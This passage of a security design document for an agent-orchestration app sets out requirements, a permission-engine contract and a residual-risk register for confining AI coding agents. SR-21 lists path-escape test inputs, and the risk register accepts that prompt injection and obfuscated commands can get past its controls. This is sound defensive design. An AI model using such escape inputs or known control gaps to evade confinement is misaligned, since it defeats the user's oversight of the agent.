| SR-10 | Every RPC method declares `MethodPolicy`; registry test fails if any method lacks one. | unit over router registry | P2 |
| SR-11 | Agent processes and terminals never receive the RPC token (env scrub). | integration: spawn agent tool, inspect env | P1 |
| SR-12 | Approval UI renders only structured fields; agent text in labelled region. | component test | P1 |
| SR-13 | CSP as in TB2. | config test parses `tauri.conf.json` | P1 |
| SR-14 | Single sanitizer path for HTML; lint rule forbids `dangerouslySetInnerHTML` elsewhere. | eslint rule + unit | P1 |
| SR-15 | xterm OSC 52 write disabled; OSC 8 links require confirmation. | component test | P1 |
| SR-16 | Remote images in agent/repo-rendered content not auto-loaded. | component test | P1 |
| SR-17 | App windows deny navigation to non-app origins. | Tauri test / *(review)* | P1 |
| SR-18 | Tauri capabilities expose only allowlisted commands. | config test | P1 |
| SR-19 | UI config validated by schema; unknown fields rejected. | unit in protocol | P3 |
| SR-20 | Approvals resolvable only by user/device principals. | unit in security | P1 |
| SR-21 | Path confinement rejects: `..`, absolute outside root, UNC `\\server\share`, `\\?\`, `\\.\`, device names, ADS `a.txt:stream`, symlink/junction escape. | unit (≥30 cases) | P1 |
| SR-22 | Agents cannot invoke `security.*`, `providers.configure`, `remote.*`, `devices.*` methods. | unit | P1 |
| SR-23 | Secret resolution checks project/environment scope; cross-project ⇒ Deny. | unit | P1 |
| SR-24 | Network capability default `Ask` (Ask/SemiAuto); egress allowlist per project. | unit | P1 (allowlist P2) |
| SR-25 | Taint escalation: tainted context ⇒ `Network`, `Secrets`, `Deploy`, `Ssh`, `DbWrite`, `Git`(push) resolve to `Ask` regardless of mode. | unit | P2 |
| SR-26 | Value-based redaction: all resolved secret values registered in a redaction set; outbound prompts, events, logs, terminal output scrubbed (min length 8). | unit | P1 |
| SR-27 | Budgets, turn limits, wall-time limits enforced; process tree killed on stop. | integration | P1 |
| SR-28 | Emergency stop completes within 2 s locally, no network required. | integration with mock provider hung | P1 |
| SR-29 | Running a script written in the same task ⇒ at least `Ask` in SemiAuto. | unit | P2 |
| SR-30 | Audit record for every mutating RPC and every tool call: `{ts, principal, method/tool, capability, resource, decision, correlationId}`. | unit | P1 |
| SR-31 | DangerousActionGuard ⇒ `Ask` in FullAuto; hard-deny list ⇒ `Deny`. | ≥100 cases (pwsh/cmd/bash) | P1 |
| SR-32 | Context segments carry `ContentOrigin`; untrusted origins delimited. | unit in context | P1 basic, P2 full |
| SR-33 | Memory items record origin; agent writes to Global Memory need approval. | unit | P1 |
| SR-34 | Browser agent in separate process/profile, no IPC. | *(review)* + integration | P2 |
| SR-35 | "Approve similar" excludes Dangerous class. | unit | P1 |
| SR-36 | Provider base URL change unbinds secret until user reconfirms. | unit | P1 |
| SR-37 | Vault entries AEAD with AAD = vault id ‖ entry name. | unit: swapped ciphertext fails | P1 |
| SR-38 | `Secret<T>` `Debug` prints `***`; `Serialize` for `Secret<T>` does not exist (compile-time). | unit + trybuild | P1 |
| SR-39 | Child env built from allowlist (`PATH`, `HOME`/`USERPROFILE`, `SYSTEMROOT`, `TEMP`, locale, …) + explicit grants. | integration | P1 |
| SR-40 | CLI adapters never open credential files of other apps. | *(review)* + test that adapter file access list is empty | P1 |
| SR-41 | Plugins never receive plaintext secrets (host-side injection). | integration | P7 |
| SR-42 | Agents cannot `terminal.write` to user-owned sessions. | unit | P1 |
| SR-43 | Obfuscated execution forms classified dangerous; unparseable ⇒ Ask. | guard unit cases | P1 |
| SR-44 | Terminal output redacted before events/model. | unit | P1 |
| SR-45 | Terminal output rate cap (default 1 MiB/s per session, coalesced 16 ms). | unit | P1 |
| SR-46 | Agent terminal cwd pinned; OS sandbox profile applied where available. | integration | P1 / P2 |
| SR-47 | Core-initiated git reads disable fsmonitor/hooks/ext protocol. | integration with malicious repo fixture | P1 |
| SR-48 | Snapshot before risky/autonomous changes. | integration | P1 |
| SR-49 | Per-repo git lock. | unit | P1 |
| SR-50 | Snapshots honor ignore files; secret-pattern files excluded from sync by default. | unit | P1 / P4 |
| SR-51..55 | Plugin signing, re-consent, MCP mapping, sandbox limits, UI isolation. | see plugin doc | P1 (MCP), P7 |
| SR-60..66 | Remote auth, device auth, E2E, no raw ports, rate limiting, local-only methods, kill switch. | see remote doc | P4 |
| SR-70..76 | Sync AEAD, signatures, anti-rollback, E2E, keyed chunk ids, quotas, key rotation on revoke, privacy policy enforcement. | see sync doc | P4 |
| SR-77..79 | Mobile step-up, encrypted push, hardware keys. | see remote doc | P5 |
| SR-80..83 | Node enrollment, fencing, per-job secrets, policy min. | see node doc | P6 |
| SR-84 | Audit hash chain + verify. | unit | P2 |
| SR-85 | Panic hook redaction; crash dumps opt-in. | unit | P1 |
| SR-86 | `cargo deny`/`cargo audit`/`npm audit` in CI. | CI | P1 |
| SR-87 | Signed updates. | release checklist *(review)* | P1 |

### 5.1 PermissionEngine context contract (extends C§6)

```rust
// orkestr-security::permission
pub enum Actor {
    LocalUser,
    RemoteDevice { device_id: DeviceId, user_id: UserId, role: DeviceRole }, // P4
    Agent { agent_id: AgentId, template_id: AgentTemplateId },
    Plugin { plugin_id: PluginId },                                          // P7
    Node { node_id: NodeId },                                                // P6
    System,                                                                  // Core-internal maintenance
}

pub struct CheckContext {
    pub project_id: Option<ProjectId>,
    pub task_id: Option<TaskId>,
    pub approval_mode: ApprovalMode,      // Ask | SemiAuto | FullAuto
    pub tainted: bool,                    // SR-25
    pub taint_origins: Vec<ContentOrigin>,
    pub environment: Option<EnvironmentKind>, // Local, Dev, Test, Staging, Production, Custom
    pub classification: DataClassification,   // Public, Internal, Confidential, Secret (§56)
    pub correlation_id: CorrelationId,
}

pub enum Decision { Allow, Ask(Reason), Deny(Reason) }

pub trait PermissionEngine: Send + Sync {
    fn check(&self, actor: &Actor, capability: Capability, resource: &Resource, ctx: &CheckContext) -> Decision;
}
```

Decision pipeline (order matters; first terminal result wins):

1. Hard-deny list (DangerousActionGuard `HardDeny`) → `Deny`.
2. Actor-class ceilings (e.g. `Plugin` without manifest grant → `Deny`; `RemoteDevice` role ceiling).
3. Privacy policy (§56): e.g. `Local Models Only` denies cloud provider calls with project content.
4. Explicit rules, narrowest scope first (Task ⊂ Agent ⊂ Project ⊂ Global); at equal scope `Deny` > `Ask` > `Allow`.
5. Dangerous class → at least `Ask` (even FullAuto).
6. Taint escalation (SR-25) → at least `Ask` for sensitive capabilities.
7. Production environment + `Write/Delete/Deploy/DbWrite` → at least `Ask`.
8. Approval-mode default.

---

## 6. Residual risk register

| ID | Risk | Why accepted / what limits it | Owner |
|----|------|-------------------------------|-------|
| R-01 | Same-user malware can read the token file, keyring, and drive Core. | Desktop OS model; documented. Optional future: Windows named pipe + DPAPI-bound token (ADR). | security |
| R-02 | Prompt injection will occasionally succeed in steering an agent. | Capability layer + taint escalation + Ask for dangerous; impact bounded to the agent's granted capabilities in its worktree. | security, agent-runtime |
| R-03 | Command classification is heuristic; novel obfuscation can classify as non-dangerous in FullAuto. | FullAuto is opt-in per project; OS sandbox (P2) narrows blast radius; snapshots allow rollback of local damage; external damage (network) limited by egress policy. | security |
| R-04 | Data sent to cloud providers can be retained by them. | §56 per-project policies, `Local Models Only` option, redaction of secrets. | providers |
| R-05 | `style-src 'unsafe-inline'` in CSP (Monaco). | Script execution still blocked; revisit with nonces/hashes. | desktop |
| R-06 | Sync metadata leakage (sizes, timing, file counts). | Chunk padding; manifests encrypted; accepted. | sync |
| R-07 | Data already synced to a later-revoked device remains exposed. | Inherent; key rotation protects future data. | sync |
| R-08 | Web client JS served by gateway can be malicious if gateway is compromised. | SRI, signed manifests, self-hosting option, step-up for dangerous actions still requires the user's authenticator but the page controls what is displayed. Recommend native apps for admin roles. | remote |
| R-09 | Loss of all devices without recovery key ⇒ synced data unrecoverable. | By design (keys never leave devices). Recovery key strongly prompted at sync setup. | sync |
| R-10 | Windows sandboxing for arbitrary dev toolchains (AppContainer) breaks many tools. | Sandbox "where practical" (§23); fallback is worktree confinement + guard + approvals. | platform |
| R-11 | Official CLI agents (Claude Code, Codex) execute their own tools inside their process; Orkestr can only constrain them through their own permission flags, cwd and env. | Run them in agent worktree, pass their most restrictive permission modes, env scrub, treat their file changes as untrusted (review pipeline). | providers |
| R-12 | Loopback TCP is reachable by other local users. | 256-bit token, ACLs, Origin/Host checks. | core |

---

## 7. Contract ambiguities / open questions (for integrator / ADR)

- **Q1** Loopback TCP vs named pipe/Unix socket for local RPC (C§3). Kept TCP; see R-01/R-12.
- **Q2** C§4 error codes have no code for "feature not implemented", while C§9.6 asks for
  `unimplemented-feature` errors. Proposal: append `unimplemented` to the error code list
  (append-only) rather than overloading `internal`. As built, the foundation
  overloads `bad_request` instead (`data.unimplementedFeature`); the proposal
  still stands.
- **Q3** C§4 does not mention `Origin`/`Host` validation; SR-03/SR-04 make it mandatory.
- **Q4** `Actor` variants for `RemoteDevice`, `Plugin`, `Node` and `CheckContext.tainted`
  extend the C§6 `check(actor, capability, resource, context)` signature — compatible but
  should be fixed in `orkestr-security` early to avoid churn.
- **Q5** No capability exists for invoking MCP tools or provider calls; we map MCP tools to
  existing capabilities by declared effect (see plugin doc) and treat cloud provider usage
  as governed by privacy policy rather than a capability.
- **Q6** New event kinds proposed (append-only): `SecurityAlert`, `RemoteSessionOpened`,
  `RemoteSessionRevoked`, `DeviceAuthorized`, `DeviceRevoked` (remote doc),
  `SyncConflictDetected` (sync doc), `NodeRegistered`, `JobAssigned`, `JobCheckpointed`,
  `JobMigrated` (node doc), `PluginInstalled`, `PluginStateChanged` (plugin doc).
- **Q7** New crates not in C§2: `orkestr-plugins` (P7), `orkestr-gateway` (P4, a separate
  deployable service). Both need an ADR + contract update before work starts.
